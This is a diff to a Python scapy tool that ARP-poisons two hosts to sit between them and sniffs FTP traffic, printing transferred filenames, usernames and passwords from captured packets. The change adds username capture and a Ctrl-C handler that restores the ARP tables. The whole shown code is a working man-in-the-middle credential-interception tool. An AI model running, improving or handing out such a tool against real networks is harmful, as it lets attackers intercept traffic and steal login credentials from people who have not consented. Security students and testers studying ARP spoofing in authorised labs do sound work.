@@ -3,8 +3,13 @@ import os
 import scapy.all as scapy
 import logging
 import logger
+import signal
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+def sigint_handle(sig, frame):
+    esuna(args)
+    exit(1)
 
 def optparsing() -> None:
     """
@@ -48,13 +53,14 @@ def restore(src_ip, src_mac, dest_ip, dest_mac):
 
 def process_packet(packet):
     try:
-        # packet.show()
         if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
             payload = packet[scapy.Raw].load.decode('utf-8')
             if 'STOR' in payload:
                 print(f'Upload Filename: {payload.split()[1]}')
             if 'RETR' in payload:
                 print(f'Download Filename: {payload.split()[1]}')
+            if 'USER' in payload:
+                print(f'User: {payload.split()[1]}')
             if 'PASS' in payload:
                 print(f'Password: {payload.split()[1]}')
             logger.info(payload)
@@ -72,13 +78,13 @@ def poison(args):
 def esuna(args):
     restore(args.src_ip, args.src_mac, args.dest_ip, args.dest_mac)
     restore(args.dest_ip, args.dest_mac, args.src_ip, args.src_mac)
+    print("..... Restoring the ARP Tables.....")
+    exit(0)
 
 def main():
     try:
+        signal.signal(signal.SIGINT, sigint_handle)
         poison(args)
-    except KeyboardInterrupt:
-        logger.info("..... Restoring the ARP Tables.....")
-        esuna(args)
     except Exception as e:
         esuna(args)
         logger.error(e)
